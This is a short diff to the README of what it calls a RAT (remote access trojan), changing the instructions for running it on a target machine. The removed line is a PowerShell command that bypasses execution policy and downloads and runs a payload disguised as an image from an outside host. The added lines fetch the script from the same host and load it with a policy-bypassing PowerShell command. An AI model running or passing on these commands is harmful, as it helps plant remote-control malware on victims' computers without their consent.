@@ -157,7 +157,13 @@ The endpoint supports several options that can be added to the url http://1.1.1.
 There are several way of executing the RAT on the target. One simple example is to use powershell:
 
 ```
-powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://1.1.1.1:1111/cat.png');
+http://1.1.1.1:1111/cat.png/ps/
+```
+
+Once the file is saved. Execute it using the following command
+
+```
+powershell -exec bypass import-module .\file.ps1
 ```
 
 The executable can be used directly
